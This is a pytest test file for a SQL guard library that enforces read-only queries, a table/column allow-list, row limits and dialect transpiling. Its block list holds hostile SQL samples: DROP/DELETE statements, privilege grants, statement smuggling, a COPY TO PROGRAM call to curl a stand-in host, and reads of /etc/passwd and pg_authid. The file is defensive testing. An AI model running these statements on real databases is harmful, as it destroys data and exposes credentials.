"""Core guard behaviour — AST rejection, allow-list, LIMIT, dialects, no-schema."""
import pytest
import sqlglot

from sqlguard import SqlBlocked, SqlGuard, validate_sql

ALLOW = {"orders": {"order_id", "amount", "status"},
         "customers": {"id", "name"}}

BLOCKED_SQL = [
    ("delete", "DELETE FROM orders"),
    ("update", "UPDATE orders SET amount = 0"),
    ("drop", "DROP TABLE orders"),
    ("truncate", "TRUNCATE orders"),
    ("create", "CREATE TABLE steal AS SELECT * FROM orders"),
    ("grant", "GRANT ALL ON orders TO attacker"),
    ("multi-statement", "SELECT 1; DROP TABLE orders"),
    ("comment-smuggle", "SELECT 1 /* ok */; DELETE FROM orders"),
    ("case-obfuscation", "dRoP tAbLe orders"),
    ("write-cte", "WITH x AS (DELETE FROM orders RETURNING *) SELECT * FROM x"),
    ("select-into", "SELECT * INTO backup FROM orders"),
    ("copy-exfil", "COPY orders TO PROGRAM 'curl evil.example'"),
    ("pg_sleep", "SELECT pg_sleep(10)"),
    ("pg_read_file", "SELECT pg_read_file('/etc/passwd')"),
    ("system-catalog", "SELECT * FROM pg_catalog.pg_authid"),
    ("info-schema", "SELECT table_name FROM information_schema.tables"),
]


@pytest.mark.parametrize("label,sql", BLOCKED_SQL, ids=[c[0] for c in BLOCKED_SQL])
def test_blocks_dangerous_sql(label, sql):
    assert not SqlGuard(ALLOW).check(sql).allowed, label


def test_allows_valid_select():
    r = SqlGuard(ALLOW).check("SELECT order_id, amount FROM orders WHERE status = 'x'")
    assert r.allowed
    assert "orders" in r.tables_used
    assert "LIMIT" in r.safe_sql.upper()


def test_unknown_table_and_column_blocked():
    g = SqlGuard(ALLOW)
    assert not g.check("SELECT * FROM employee_payroll").allowed
    r = g.check("SELECT customer_password FROM orders")
    assert not r.allowed
    assert any("customer_password" in e for e in r.errors)


def test_limit_injected_and_clamped():
    g = SqlGuard(ALLOW, row_limit=500)
    assert g.check("SELECT order_id FROM orders").limit_applied == 500
    assert g.check("SELECT order_id FROM orders LIMIT 999999").limit_applied == 500
    # a small explicit limit is preserved
    assert g.check("SELECT order_id FROM orders LIMIT 10").limit_applied == 10


def test_no_allowlist_mode_still_enforces_readonly_and_limit():
    g = SqlGuard()  # no schema
    assert g.check("SELECT * FROM anything_at_all").allowed        # AST-safe + LIMIT
    assert not g.check("DROP TABLE anything").allowed              # still blocked


@pytest.mark.parametrize("dialect,quote", [("mysql", "`"), ("bigquery", "`"),
                                           ("postgres", '"')])
def test_transpiles_to_target_dialect(dialect, quote):
    g = SqlGuard({"sales": {"region", "revenue"}}, target_dialect=dialect)
    r = g.check('SELECT "region", "revenue" FROM "sales"')
    assert r.allowed
    assert quote in r.safe_sql
    assert sqlglot.parse_one(r.safe_sql, read=dialect) is not None   # valid in target


def test_ensure_returns_safe_sql_or_raises():
    g = SqlGuard(ALLOW)
    assert g.ensure("SELECT amount FROM orders").upper().startswith("SELECT")
    with pytest.raises(SqlBlocked):
        g.ensure("DROP TABLE orders")


def test_functional_api():
    assert validate_sql("SELECT 1 AS x", None).allowed
    assert not validate_sql("DELETE FROM t", None).allowed
